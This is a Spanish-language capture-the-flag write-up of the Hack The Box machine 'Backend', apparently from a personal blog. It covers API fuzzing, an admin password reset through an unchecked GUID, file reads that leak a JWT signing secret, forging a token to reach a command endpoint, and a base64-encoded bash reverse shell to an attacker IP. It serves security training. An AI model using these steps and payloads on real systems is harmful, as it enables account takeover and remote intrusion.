---
layout: single
title: Backend - Hack The Box
excerpt: "Con esta máquina aprendemos explotacion de APIs"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-backend/backend1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - APIs
---

# 10.10.11.161 - Backend

![](/assets/images/htb-backend/backend1.png)

----------------------
# Part 1: Enumeración

Puertos abiertos: 22(ssh), 80(http)

```console
└─$ whatweb http://10.10.11.161
http://10.10.11.161 [200 OK] Country[RESERVED][ZZ], HTTPServer[uvicorn], IP[10.10.11.161]
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.161/FUZZ/
000000076:   307        0 L      0 W        0 Ch        "docs"
000001012:   307        0 L      0 W        0 Ch        "api"
```
Hay un subdirectorio **/api**:


![](/assets/images/htb-backend/backend2.PNG)

> Una api es una web diseñada para los programas en vez de para las persoanas, por eso no tiene interfaz grafica 
> y funciona principalmente por intercambio de datos en formato json en rutas conocidas como **endpoints**

Siguiendo con el fuzzing a la api ```http://10.10.11.161/api/FUZZ/``` damos con **/v1** y dentro con **/admin**.

```console
└─$ curl -s http://10.10.11.161/api/v1
{"endpoints":["user","admin"]}
└─$ curl -s http://10.10.11.161/api/v1/user 
{"detail":"Not Found"}       # Aunque ponga esto, por el funcionamiento de las apis suele haber /1, /2...
└─$ curl -s http://10.10.11.161/api/v1/user/1
{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","date":null,"time_created":1649533388111,"is_superuser":true,"id":1}
```
Probé a enumerar usuarios pero no di con nada
```console
 └─$ for i in $(seq 1 20); do curl -s http://10.10.11.161/api/v1/user/$i; echo; done
{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","date":null,"time_created":1649533388111,"is_superuser":true,"id":1}
null
null
null
...
```

La ruta /docs nos devuelve "not authenticated" Lo unico que queda es cambiar el metodo.
```console
└─$ wfuzz -c --hc=405 -t 200 -X POST -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.161/api/v1/user/FUZZ
000000039:   422        0 L      3 W        172 Ch      "login"                                              
000000203:   422        0 L      2 W        81 Ch       "signup"   
```
----------------------
# Part 2: Creando un usaurio

```console
└─$ curl -s -X POST http://10.10.11.161/api/v1/user/login -d {'loc':'test'} | jq
{ "detail": [
     {"loc": [
        "body",
        "username" ],
      "msg": "field required",
      "type": "value_error.missing"},
    {"loc": [
        "body",
        "password"],
      "msg": "field required",
      "type": "value_error.missing"}]}
└─$ curl -s -X POST http://10.10.11.161/api/v1/user/signup -H "Content-Type: application/json" -d '{"username":"cucuxii", "password":"cucucxii123"}' | jq 
# Error falta el campo email
└─$ curl -s -X POST http://10.10.11.161/api/v1/user/signup -H "Content-Type: application/json" -d '{"username":"cucuxii", "password":"cucucxii123","email":"cucuxii@htb.local"}' | jq
└─$ curl -s -X POST http://10.10.11.161/api/v1/user/login -H "Content-Type: application/json" -d '{"username":"cucuxii", "password":"cucucxii123"}' | jq
# Error falta username y password
```

Como nos da error porque faltan dos campos que si se están enviando, habra que ponerlo de otro modo,
```console
└─$ curl -s -X POST http://10.10.11.161/api/v1/user/login -d "username=cucuxii&password=cucucxii123" 
{"detail":"Incorrect username or password"}
└─$ curl -s -X POST http://10.10.11.161/api/v1/user/login -d "username=cucuxii@htb.local&password=cucucxii123"
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MDkzMTI0LCJpYXQiOjE2Njc0MDE5MjQsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiNDNjOTljOTAtZDBlNC00ZDVmLWIzODMtY2YyZTgyZGE2MjI0In0.ay1YLsGdoWBqF-DwBZfv9vo7zgUcxHEPh200zqBfmuI","token_type":"bearer"}
```

Nos da un token que habrá que arrastrar todo el rato del lado de la autenticacion, asi que mejor hacerse un script
Si lo decodificamos en jwt.io es muy similar a lo que obtuvimos de admin solo que "is_superuser : false"

![](/assets/images/htb-backend/backend3.PNG)

```bash
#!/usr/bin/bash
bearer=$(curl -s -X POST http://10.10.11.161/api/v1/user/login -d "username=cucuxii@htb.local&password=cucucxii123" | jq | grep -oP '".*?"' | awk 'NR==2' | tr -d '"')
curl -s -X GET -H "Authorization: bearer $bearer" http://10.10.11.161/api/v1/admin/
```
```console
└─$ ./auth.sh
{"results":false}
```
La ruta /docs ```http://10.10.11.161/docs/``` no devuelve nada y si le ponemos -I aplica un redirect, aun asi 
poniendo -L para seguirlo no hay suerte.

Si lo abrimos por el navegador, pero añadiendo la cabecera de Authorization: bearer ... con este 
[plugin](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/) podemos acceder a una web js con todos los endpoints.
![](/assets/images/htb-backend/backend4.PNG)
![](/assets/images/htb-backend/backend5.PNG)

Por ejemplo sale este nuevo /api/v1/user/SecretFlagEndpoint (se puede ejecutar tanto desde la web como desde curl)

```console
└─$ curl -X 'PUT' \
  'http://10.10.11.161/api/v1/user/SecretFlagEndpoint' \
  -H 'accept: application/json' \
  -H 'Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6Ik...
{"user.txt":"e66d6585b7ae1f526bf27e341f0d880c"}  
```
Tambien hay dos nuevos endpoints del admin, uno para leer archivos de la máquina y otro para ejecutar comandos en ella, pero no podemos por no ser admin.
El endpoint /docs (o sea donde estamos) tira de openapi.json, de ahí saca la información la web actual (y nos muestra como funcionan todos los endpoints)

----------------------
# Part 3: Accediendo al usuario admin

Uno de los endpoints más criticos es es de /api/v1/user/updatepass. Nos pide guid y password, el guid es el identificado de usuario y la contraseña, la nueva que
cambiarle.

Se supone que está para ponerle tu guid, pero se le podría poner otro.
```console
└─$ curl -s http://10.10.11.161/api/v1/user/2{"guid":"43c99c90-d0e4-4d5f-b383-cf2e82da6224","email":"cucuxii@htb.local","date":null,"time_created":1667401713796,"is_superuser":false,"id":2}
└─$ curl -s http://10.10.11.161/api/v1/user/1
{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284","email":"admin@htb.local","date":null,"time_created":1649533388111,"is_superuser":true,"id":1} 
```
![](/assets/images/htb-backend/backend6.PNG)

En el endpoint nos muestran el comando por curl:
```console
curl -X POST 'http://10.10.11.161/api/v1/user/updatepass' \
  -H 'accept: application/json' -H 'Content-Type: application/json' \
  -H 'Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6Ik...' \
  -d '{ "guid": "36c2e94a-4271-4259-93bf-c96ad5948284", "password": "cucuxii123" }'
```
Como le hemos cambiado la contraseña al admin, deberíamos poder conectanos como él:

```console
└─$ curl -s -X POST http://10.10.11.161/api/v1/user/login -d "username=admin@htb.local&password=cucuxii123"
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MTE0MjgzLCJpYXQiOjE2Njc0MjMwODMsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.Ghu7tUuWPi58GvtcdvQnkHc0jZK32VzN1LxrkfKkSgA","token_type":"bearer"} 
```
En el navegador podemos cambiar el authorization bearer por el nuevo para que nos reconozca como admin.
En el endpoint **/admin** nos dicen que si que somos admin ya.

Tenemos el endpoint de comandos -> **/api/v1/admin/exec**
```console
curl -X GET 'http://10.10.11.161/api/v1/admin/exec/whoami' \
  -H 'accept: application/json' \
  -H 'Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpX...' \
{"detail":"Debug key missing from JWT"}   
```

Y el de leer archivos -> **/api/v1/admin/file**, este es mejor scriptearselo para tardar menos
```bash
#!/bin/bash
bearer="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MTE0MjgzLCJpYXQiOjE2Njc0MjMwODMsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQifQ.Ghu7tUuWPi58GvtcdvQnkHc0jZK32VzN1LxrkfKkSgA"

while true
do
  echo -n "$:> " && read file
  curl -s -X POST 'http://10.10.11.161/api/v1/admin/file' \
  -H 'accept: application/json' -H 'Content-Type: application/json' \
  -H "Authorization: bearer $bearer" -d '{"file":"'$file'"}' | sed 's/\\n/\n/g' | sed 's/\\u0000/\n/g' ; echo
done
```
```console
$:> /etc/passwd
{"file":"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
# Existen los usuarios htb y root
/proc/self/environ
{"file":"APP_MODULE=app.main:app
PWD=/home/htb/uhc
$:> /home/htb/uhc/app/main.py
# El codigo de la app, destacando que importa tanto librerias internas
from app.schemas.user import User # -> /home/htb/uhc/app/schemas/user.py 
from app.api.v1.api import api_router 
from app.core.config import settings # -> /home/htb/uhc/app/core/config.py
from app import deps
from app import crud
# Tambien esto
uvicorn.run(app, host=\"0.0.0.0\", port=8001, log_level=\"debug\")
$:> /home/htb/uhc/app/core/config.py
JWT_SECRET: str = \"SuperSecretSigningKey-HTB\" # -> la key
FIRST_SUPERUSER: EmailStr = \"root@ippsec.rocks\" # -> lolazo
```
----------------------
# Part 4: Consiguiendo ejecución de comandos

Vamos a crear nustra jwt otra vez pero con este parametro "Debug"
```python
>>> import jwt
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2Vu...
>>> secret = "SuperSecretSigningKey-HTB"
>>> cookie = jwt.decode(token, secret, ["HS256"]))
>>> cookie["debug"] = True
>>> cookie
{'type': 'access_token', 'exp': 1668114283, 'iat': 1667423083, 'sub': '1', 'is_superuser': True, 'guid': '36c2e94a-4271-4259-93bf-c96ad5948284', 'debug': True}
>>> jwt.encode(cookie, secret, "HS256")
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MTE0MjgzLCJpYXQiOjE2Njc0MjMwODMsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.iZFvYEBJbK9PX4xl1SfdfUwowHOoD34pMHozKr4wUeA'
```
Ya tenemos dicho token valido, asi que podemos utilizar este comando.
```bash
#!/bin/bash

bearer="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MTE0MjgzLCJpYXQiOjE2Njc0MjMwODMsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImd1aWQiOiIzNmMyZTk0YS00MjcxLTQyNTktOTNiZi1jOTZhZDU5NDgyODQiLCJkZWJ1ZyI6dHJ1ZX0.iZFvYEBJbK9PX4xl1SfdfUwowHOoD34pMHozKr4wUeA"
while true
do
  echo -n "$:> " && read command
  curl -s -X GET "http://10.10.11.161/api/v1/admin/exec/$command" \
  -H 'accept: application/json' -H 'Content-Type: application/json' -H "Authorization: bearer $bearer"; echo
done
```
```console
└─$ ./command.sh
$:> id
"uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)"
```
Como le estamos pasando el comando a una url, hay que urlencodearlo (espacios a %20 y & a %26) o formatearlo
```console
└─$ echo 'bash -c "bash  -i >& /dev/tcp/10.10.14.6/443 0>&1"' | base64
YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK
echo%20YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK|base64%20-d|bash
# echo YmFzaCAtYyAiYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSIK | base64 -d | bash
```
Con netcat conseguimos la shell

```
htb@Backend:~/uhc$ grep -r pass *
# nada
htb@Backend:~/uhc$ ls
__pycache__  app         poetry.lock      pyproject.toml    uhc.db
alembic      auth.log    populateauth.py  requirements.txt
alembic.ini  builddb.sh  prestart.sh      run.sh
htb@Backend:~/uhc$ cat auth.log
11/02/2022, 14:14:00 - Login Failure for Tr0ub4dor&3
htb@Backend:~/uhc$ su root
Password: 
root@Backend:/home/htb/uhc# cd 
```